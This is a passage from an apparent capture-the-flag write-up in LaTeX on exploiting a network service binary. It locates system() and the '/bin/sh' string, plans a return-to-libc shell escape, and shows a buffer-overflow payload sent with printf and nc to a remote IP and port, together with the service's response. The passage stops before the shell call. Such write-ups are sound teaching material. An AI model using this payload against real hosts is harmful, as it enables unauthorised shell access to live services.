...
Interestingly, \verb+$(ls)+ gives us the help screen for \verb+nc+.  
...
In the binary are also entry points for the \verb+system+ function at address
\verb+0x00400610+ and the string \verb+/bin/sh+ is stored at \verb+0x00400978+.
So we can construct a shell escape.  Let us first test that we can call the
\verb+printf+ function with the \verb+/bin/sh+ as an argument:

Search for ``return to libc exploit'' or ``one gadget exploit'' to
get the proper documentation.

\begin{verbatim} 
brp(DESKTOP-FH3H4P9)253$ printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDD\x2c\x08\x40\x00\x00\x00\x00\x00\n" | nc 46.101
.107.117 2102
Welcome! Please give me your name!
> Hi AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDD@, nice to meet you!
Welcome! Please give me your name!
> [!] Anti DoS Signal. Patch me out for testing.
brp(DESKTOP-FH3H4P9)254$
\end{verbatim} 

So we can execute printf twice...

Now call system with an argument of /bin/sh
